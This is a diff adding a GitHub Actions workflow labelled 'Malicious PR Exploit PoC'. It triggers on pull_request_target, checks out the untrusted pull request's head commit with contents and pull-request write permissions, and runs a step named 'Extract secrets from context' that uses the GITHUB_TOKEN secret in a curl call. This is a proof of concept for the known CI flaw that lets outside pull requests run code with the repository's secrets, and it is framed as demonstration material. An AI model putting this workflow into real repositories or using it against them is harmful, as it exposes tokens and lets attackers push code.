@@ -1,0 +1,25 @@
+name: Malicious PR Exploit PoC
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+jobs:
+  exploit:
+    name: Demonstrate RCE via pull_request_target
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
+    
+    steps:
+    - name: Checkout code (with unsafe ref)
+      uses: actions/checkout@v3
+      with:
+        ref: ${{ github.event.pull_request.head.sha }}
+    
+    - name: Extract secrets from context
+      run: |
+        echo "Running in repository: $GITHUB_REPOSITORY"
+        # This demonstrates we're executing in base repo context
+        curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+             https://api.github.com/repos/${{ github.repository }} | jq '.permissions'
